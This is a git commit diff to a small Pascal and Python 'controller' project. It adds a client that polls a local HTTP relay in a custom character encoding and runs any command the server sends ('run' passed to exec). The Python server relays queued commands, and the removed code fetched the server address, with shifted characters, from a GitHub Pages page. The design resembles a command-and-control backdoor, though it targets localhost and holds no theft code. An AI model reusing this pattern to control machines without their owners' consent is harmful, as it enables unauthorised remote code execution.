d3ce5ef4054612903770a2928c3a3d7103b8ca59
sudo-gea <gera.tatarinov.999@gmail.com>
2021-06-06 17:03:41 +0300

    *interesting commit message*

--- controller.pas
+++ controller.pas
@@ -1,5 +1,8 @@
 uses System.IO, System.Net;
  
+var
+	url:string;
+
 function urlopen(url:string):string;
 var 
 	html : string;
@@ -18,12 +21,226 @@ end;
 
 function len(q:
 	string):integer;begin len:=q.length;end;
+function len(q:
+	array of string):integer;begin len:=length(q);end;
+function len(q:
+	array of array of string):integer;begin len:=length(q);end;
+function len(q:
+	array of array of array of string):integer;begin len:=length(q);end;
+function len(q:
+	array of integer):integer;begin len:=length(q);end;
+function len(q:
+	array of array of integer):integer;begin len:=length(q);end;
+function len(q:
+	array of array of array of integer):integer;begin len:=length(q);end;
+function len(q:
+	array of real):integer;begin len:=length(q);end;
+function len(q:
+	array of array of real):integer;begin len:=length(q);end;
+function len(q:
+	array of array of array of real):integer;begin len:=length(q);end;
+
+procedure push_back(var a: array of
+	integer; value:
+	integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of integer; value:
+	array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of integer; value:
+	array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of integer; value:
+	array of array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of array of integer; value:
+	array of array of array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of array of array of integer; value:
+	array of array of array of array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of array of array of array of integer; value:
+	array of array of array of array of array of array of integer);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	real; value:
+	real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of real; value:
+	array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of real; value:
+	array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of real; value:
+	array of array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of array of real; value:
+	array of array of array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of array of array of real; value:
+	array of array of array of array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of array of array of array of real; value:
+	array of array of array of array of array of array of real);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	string; value:
+	string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of string; value:
+	array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of string; value:
+	array of array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of string; value:
+	array of array of array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of array of string; value:
+	array of array of array of array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+procedure push_back(var a: array of
+	array of array of array of array of array of string; value:
+	array of array of array of array of array of string);begin SetLength(a, length(a) + 1);a[length(a) - 1]:= value;end;
+
+procedure emplace_back(var a: array of
+	integer);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of integer);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of integer);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of integer);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of array of integer);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of array of array of integer);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of array of array of array of integer);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	real);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of real);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of real);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of real);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of array of real);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of array of array of real);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of array of array of array of real);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	string);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of string);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of string);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of string);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of array of string);begin SetLength(a, length(a) + 1);end;
+procedure emplace_back(var a: array of
+	array of array of array of array of array of string);begin SetLength(a, length(a) + 1);end;
+
+function int(q:string):integer;
+begin
+	var e:=0;
+	if not(integer.tryparse(q,e)) then println('error in int with',q);
+	int:=e;
+end;
+
+function communicate(q: array of string):array of string;
+begin
+	var t:string;
+	for var w:=0 to len(q)-1 do
+	begin
+		t+='q';
+		for var e:=1 to len(q[w]) do
+		begin
+			t+='w';
+			var o:=ord(q[w][e]).tostring();
+			while len(o)<10 do
+			begin
+				o:='0'+o;
+			end;
+			t+=o;
+		end;
+	end;
+	t+='r';
+	var i:string;
+	while len(t)>0 do
+	begin
+		if len(t)>96 then
+		begin
+			i+=urlopen(url+'usr'+t[1:97]);
+			t:=t[97:];
+		end
+		else
+		begin
+			i+=urlopen(url+'usr'+t[1:]);
+			t:='';
+		end;
+	end;
+	t:=i;
+	var u:array of string;
+	SetLength(u,1);
+	SetLength(u,0);
+	while len(t)>0 do
+	begin
+		if      t[1]='q' then
+		begin
+			emplace_back(u);
+			t:=t[2:];
+		end
+		else if t[1]='w' then
+		begin
+			u[len(u)-1]+=chr(int(t[2:12]));
+			t:=t[12:];
+		end
+		else
+		begin
+			if len(t)>1 then t:=t[2:] else t:='';
+		end;
+	end;
+	communicate:=u;
+end;
 
 begin
-	var url:=urlopen('https://sudo-gera.github.io/controller/');
-	for var w:=1 to len(url) do
+	// url:=urlopen('https://sudo-gera.github.io/controller/');
+	url:='http://127.0.0.1:9999/';
+	while true do
 	begin
-		url[w]:=chr(ord(url[w])-1);
+		var todo:=communicate(arr('download'));
+		if len(todo)>0 then
+		begin
+			if todo[0]='exit' then
+			begin
+				halt;
+			end
+			else if todo[0]='get' then
+			begin
+				if len(todo)>1 then
+				begin
+					// open(todo[1]).read()
+				end;
+			end
+			else if todo[0]='put' then
+			begin
+				if len(todo)>1 then
+				begin
+					println(todo[1]);
+					// open(todo[1]).write()
+				end;
+			end 
+			else if todo[0]='run' then
+			begin
+				if len(todo)>1 then
+				begin
+					exec(todo[1]);
+				end;
+			end 
+		end
+		else
+			sleep(100);
 	end;
-	print(url);
 end.
--- controller.py
+++ controller.py
@@ -7,18 +7,47 @@ def bg_run(f):
 	from threading import Thread
 	Thread(target=f).start()
 
+port=9999
+
+def load(q):
+	a=[]
+	while q:
+		if   q[0]=='q':
+			a.append('')
+			q=q[1:]
+		elif q[0]=='w':
+			a[-1]+=chr(int(q[1:11]))
+			q=q[11:]
+		else:
+			q=q[1:]
+	return a
+def dump(q):
+	return ''.join(['q'+''.join(['w'+('0'*10+str(ord(r)))[-10:] for r in e]) for e in q])+'r'
+
+
 @bg_run
 def run_server_thread():
-	port=9999
-	send_q=[]
-	read_q=[]
+	to_q={'adm':[],'usr':[]}
+	to_b={'adm':'','usr':''}
 	from http.server import BaseHTTPRequestHandler, HTTPServer
 	class MyServer(BaseHTTPRequestHandler):
 		def do_GET(self):
 			path=self.path
-			ret='---'
-
-
+			ret=''
+			path=path[1:]
+			fr=path[:3]
+			to='usr' if fr=='adm' else 'adm'
+			path=path[3:]
+			to_b[to]+=path
+			if 'r' in to_b[to]:
+				to_q[to].append(to_b[to])
+				to_b[to]=''
+				if to_q[to][-1]==dump(['download']):
+					to_q[to].pop()
+					if to_q[fr]:
+						ret=to_q[fr][0]
+						to_q[fr]=to_q[fr][1:]
+			# print(to_q,to_b)
 			self.send_response(200)
 			self.send_header("Content-type", "text/html; charset=utf-8")
 			self.end_headers()
@@ -48,9 +77,20 @@ def publish_url(url):
 		if url.startswith(w[1]):
 			url=w[0]+url
 			break
-	url=''.join([chr(ord(w)+1) for w in url])
 	open(str(abspath(dirname(__file__)))+'/index.html','w').write(url)
 	chdir(str(abspath(dirname(__file__))))
 	system(home+'gitpush')
 
-publish_url('127.0.0.1:9999')
+def communicate(a,me='adm'):
+	a=dump(a)
+	from urllib.request import urlopen
+	s=''
+	while a:
+		s+=urlopen('http://127.0.0.1:9999/'+me+a[:96]).read().decode()
+		a=a[96:]
+	s=load(s)
+	return s
+# publish_url('127.0.0.1:9999')
+
+while 1:
+	exec(input())
